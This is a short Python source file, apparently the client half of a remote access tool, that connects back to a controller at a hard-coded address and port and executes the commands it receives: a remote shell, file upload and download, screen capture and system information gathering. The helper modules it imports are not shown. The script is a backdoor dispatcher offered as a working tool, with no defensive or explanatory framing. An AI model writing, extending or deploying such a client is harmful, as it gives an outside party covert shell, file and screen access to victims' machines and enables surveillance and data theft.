#!/usr/bin/python3.7
# -*- coding: utf-8 -*-
# @Author  : Cr4y0n
# @Software: PyCharm
# @Time    : 2020/8/15 17:17

import socket
from clientModule.shell import Shell
from clientModule.fileOperation import FileOPT
from clientModule.screen import Screen
from lib.dsSocket import *
from clientModule.infoGather import InfoGather

if __name__ == "__main__":
    host = "127.0.0.1"
    port = 1116
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host, port))
    shell = Shell(client)
    while True:
        cmd = DShellRecv(client)
        if cmd == "shell":
            shell.shell()
        elif cmd[:6] == "upload":
            FileOPT(client, cmd).upload()
        elif cmd[:8] == "download":
            FileOPT(client, cmd).download()
        elif cmd == "screen":
            Screen(client)
        elif cmd == "info":
            InfoGather(client)
        elif cmd in ["quit", "q", "exit"]:
            break
    client.shutdown(2)
    client.close()
